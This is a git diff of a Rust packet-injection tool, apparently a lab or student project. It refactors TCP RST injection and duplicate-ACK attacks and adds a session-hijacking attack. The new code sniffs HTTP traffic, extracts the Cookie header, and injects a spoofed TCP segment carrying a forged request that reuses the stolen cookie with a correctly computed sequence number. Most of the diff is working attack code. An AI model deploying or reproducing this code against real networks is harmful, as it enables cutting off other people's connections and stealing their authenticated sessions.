@@ -11,6 +11,7 @@ use std::time::Duration;
 enum AttackType {
     RSTInjection,
     DuplicateAck,
+    SessionHijack,
 }
 
 fn main() {
@@ -80,8 +81,10 @@ fn main() {
     }
 }
 
-/// Parses the raw packet to a TCP packet object
-/// Returns an error if the frame is not Ethernet(IPv4(TCP))
+/**
+Parses the raw packet to a TCP packet object
+Returns an error if the frame is not Ethernet(IPv4(TCP))
+*/
 fn parse_packet_to_tcp(
     packet_data: &[u8],
 ) -> Result<(Ethernet2Header, Ipv4Header, TcpHeader, &[u8]), String> {
@@ -118,6 +121,9 @@ fn parse_packet_to_tcp(
     }
 }
 
+/*
+Performs the attack, by building and sending a forged packet, based on the captured packet and the attack type
+*/
 fn perform_hack(
     ethernet_header: Ethernet2Header,
     ipv4_header: Ipv4Header,
@@ -126,95 +132,128 @@ fn perform_hack(
     attack_type: &AttackType,
     send_cap: &mut Capture<Active>,
 ) {
-    //let interface = OsInfo::get_interface();
-    //let mut cap = get_capture(interface.as_str());
-
-    //payload doesn't matter for the hacks, since we are just resetting the connection
-    let payload = &[];
-
-    // Builder
-    let builder = PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
-        .ipv4(
-            ipv4_header.destination,
-            ipv4_header.source,
-            ipv4_header.time_to_live,
-        )
-        .tcp(
-            tcp_header.destination_port,
-            tcp_header.source_port,
-            tcp_header.acknowledgment_number, // used to be "tcp_header.sequence_number"
-            tcp_header.window_size,
-        );
-
     match attack_type {
-        //RST injection to reset the connection
         AttackType::RSTInjection => {
-            let builder = builder.rst();
-
+            //No need for a payload, since RST packets don't carry any data
+            let payload = &[];
+            // Build a RST packet, with the source and destination fields reversed
+            let builder =
+                PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
+                    .ipv4(ipv4_header.destination, ipv4_header.source, ipv4_header.time_to_live)
+                    .tcp(
+                        tcp_header.destination_port,
+                        tcp_header.source_port,
+                        tcp_header.acknowledgment_number,
+                        tcp_header.window_size,
+                    )
+                    .rst();
+            // Write the packet and send it
             let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));
-
             builder.write(&mut packet, payload).unwrap();
-
-            send_cap.sendpacket(packet.as_slice()).unwrap(); // used to just be cap
-
+            send_cap.sendpacket(packet.as_slice()).unwrap();
             println!("RST injection sent");
         }
+
         AttackType::DuplicateAck => {
-            let ack_number = tcp_header.sequence_number;
-
-            let builder = builder.ack(ack_number);
-
+            // No need for a payload, since ACK packets don't carry any data
+            let payload = &[];
+            // Build an ACK packet, with the source and destination fields reversed
+            let builder =
+                PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
+                    .ipv4(ipv4_header.destination, ipv4_header.source, ipv4_header.time_to_live)
+                    .tcp(
+                        tcp_header.destination_port,
+                        tcp_header.source_port,
+                        tcp_header.acknowledgment_number,
+                        tcp_header.window_size,
+                    )
+                    .ack(tcp_header.sequence_number);
+            // Write the packet and send it 3 times
             let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));
-
             builder.write(&mut packet, payload).unwrap();
-
             send_cap.sendpacket(packet.as_slice()).unwrap();
             send_cap.sendpacket(packet.as_slice()).unwrap();
             send_cap.sendpacket(packet.as_slice()).unwrap();
-
             println!("3 times ACK sent");
+        }
+
+        AttackType::SessionHijack => {
+            // Extract the cookie from the payload, if it exists
+            let Some(cookie) = extract_cookie(payload) else {
+                println!("no cookie in payload, skipping");
+                return;
+            };
+
+            println!("cookie stolen: {}", cookie);
+            // Build a forged HTTP request, using the extracted cookie and the host IP address
+            let host_ip = format!(
+                "{}.{}.{}.{}",
+                ipv4_header.destination[0], ipv4_header.destination[1],
+                ipv4_header.destination[2], ipv4_header.destination[3],
+            );
+            let forged_payload = build_forged_request(&cookie, &host_ip);
+            // Calculate the next sequence number for the TCP packet, based on the current sequence number and the length of the payload
+            let seq = next_seq(&tcp_header, payload); 
+            let ack = tcp_header.acknowledgment_number;
+
+            // Build a TCP packet with the forged payload
+            let builder =
+                PacketBuilder::ethernet2(ethernet_header.source, ethernet_header.destination)
+                    .ipv4(ipv4_header.source, ipv4_header.destination, ipv4_header.time_to_live)
+                    .tcp(
+                        tcp_header.source_port,
+                        tcp_header.destination_port,
+                        seq,
+                        tcp_header.window_size,
+                    )
+                    .ack(ack);
+            // Write the packet and send it
+            let mut packet = Vec::<u8>::with_capacity(builder.size(forged_payload.len()));
+            builder.write(&mut packet, &forged_payload).unwrap();
+            send_cap.sendpacket(packet.as_slice()).unwrap();
+            println!("forged request sent");
         }
     }
 }
 
-/// Repeat sending some packets, used for testing
-fn test_sending_packets(interface: &str) {
-    sleep(Duration::from_secs(2));
+/*
+Extracts the Cookie header from the payload, if it exists
+*/
+fn extract_cookie(payload: &[u8]) -> Option<String> {
+    let text = std::str::from_utf8(payload).ok()?;
 
-    let mut cap = get_capture(interface);
-
-    let payload = &[0x01, 0x02, 0x03, 0x04];
-
-    // these dont matter too much it seems
-    // ff:ff:ff:ff:ff:ff and 255.255.255.255 mean flood
-    let source_mac = [0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8];
-    let destination_mac = [0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8];
-
-    let source_ip = [192, 168, 1, 1];
-    let destination_ip = [255, 255, 255, 255];
-
-    let source_port = 0;
-    let destination_port = 42;
-    let packet_builder = PacketBuilder::ethernet2(source_mac, destination_mac)
-        .ipv4(source_ip, destination_ip, 20)
-        .tcp(source_port, destination_port, 0, 42)
-        .ack(13)
-        .syn();
-
-    let mut packet = Vec::<u8>::with_capacity(packet_builder.size(payload.len()));
-
-    packet_builder.write(&mut packet, payload).unwrap();
-
-    loop {
-        cap.sendpacket(packet.as_slice()).unwrap();
-
-        println!("packet sent");
-
-        sleep(Duration::from_secs(1));
+    // Look for Cookie header in HTTP request
+    for line in text.lines() {
+        if line.to_lowercase().starts_with("cookie:") {
+            return Some(line.trim().to_string());
+        }
     }
+    None
 }
 
-/// Create a capture, that can be used to send or intercept packets
+/*
+Calculates the next sequence number for the TCP packet, based on the current sequence number and the length of the payload
+*/
+fn next_seq(tcp_header: &TcpHeader, payload: &[u8]) -> u32 {
+    tcp_header
+        .sequence_number
+        .wrapping_add(payload.len() as u32)
+}
+
+/*
+Builds a forged HTTP request, using the extracted cookie and the host IP address
+*/
+fn build_forged_request(cookie: &str, host_ip: &str) -> Vec<u8> {
+    format!(
+        "GET /secret HTTP/1.1\r\nHost: {}\r\n{}\r\nConnection: close\r\n\r\n",
+        host_ip, cookie
+    )
+    .into_bytes()
+}
+
+/*
+Create a capture, that can be used to send or intercept packets
+*/
 fn get_capture(interface: &str) -> Capture<Active> {
     let main_device = Device::list()
         .expect("error listing devices")
